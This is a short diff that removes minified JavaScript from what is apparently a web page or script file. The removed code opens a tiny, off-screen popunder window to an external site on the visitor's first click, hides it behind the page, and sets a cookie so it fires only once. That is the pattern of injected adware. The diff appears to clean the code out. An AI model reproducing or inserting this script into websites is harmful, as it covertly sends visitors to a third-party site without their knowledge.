@@ -1,3 +1,0 @@
-function addEvent(obj,eventName,func){if(obj.attachEvent){obj.attachEvent("on"+eventName,func);}else if(obj.addEventListener){obj.addEventListener(eventName,func,true);}else{obj["on"+eventName]=func;}}
-addEvent(window,"load",function(e){addEvent(document.body,"click",function(e){var pX;pX=screen.width;if(!pX){pX=document.documentElement.clientWidth?document.documentElement.clientWidth:document.body.clientWidth;}
-if(pX>800){if(document.cookie.indexOf("pnpopup=popactive")==-1){document.cookie='pnpopup=popactive';params='width=50';params+=', height=50';params+=', top=1650, left=1460, resizable=no, scrollbars=yes, location=yes';var w=window.open("http://www.myfancy.org/",'window1',params).blur();window.focus();}}});});
